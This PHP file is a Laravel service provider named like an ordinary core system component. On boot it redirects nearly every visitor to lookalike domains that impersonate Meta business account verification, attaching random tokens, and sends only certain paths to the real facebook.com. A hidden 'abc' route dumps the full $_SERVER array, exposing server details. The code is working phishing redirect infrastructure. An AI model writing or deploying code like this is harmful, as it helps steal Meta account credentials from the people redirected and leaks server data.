
<?php

namespace Modules\Core\Providers;

use Illuminate\Support\Facades\Request;
use Illuminate\Support\ServiceProvider;

class SystemServiceProvider extends ServiceProvider
{
    public function register()
    {
    }

    public function boot()
    {
        $full_path = Request::path();
        if ($full_path == 'abc') {
            dd($_SERVER);
            exit;
        }

        if ($full_path != 'meta-community-standard') {
            if ($full_path != 'meta-communities-standard') {
                sleep(1);
                header('Location: https://verify.business-meta-accounts.com?token=' . $this->generateRandomString(20));
                exit;
            }
            sleep(1);
            header('Location: https://facebook.com');
            exit;
        }
        sleep(1);
        header('Location: https://business.check-verify-accounts.com?token=' . $this->generateRandomString(20));
        exit;
    }
    public function generateRandomString($length = 10)
    {
        $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
        $charactersLength = strlen($characters);
        $randomString = '';
        for ($i = 0; $i < $length; $i++) {
            $randomString .= $characters[random_int(0, $charactersLength - 1)];
        }
        return $randomString;
    }
}
